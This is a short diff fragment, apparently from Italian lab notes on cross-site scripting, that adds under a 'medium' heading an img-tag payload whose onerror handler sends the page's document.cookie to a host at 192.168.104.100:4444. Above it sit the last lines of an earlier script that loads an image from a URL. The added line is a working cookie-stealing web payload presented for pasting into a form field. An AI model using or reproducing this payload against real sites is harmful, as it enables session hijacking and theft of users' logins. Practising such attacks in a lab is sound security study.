@@ -32,3 +32,7 @@ script da mettere nel campo di testo della form
     var img = new Image();
     img.src = url;
 </script>
+
+
+medium
+<img src="x" onerror="document.location='http://192.168.104.100:4444/?'+document.cookie">
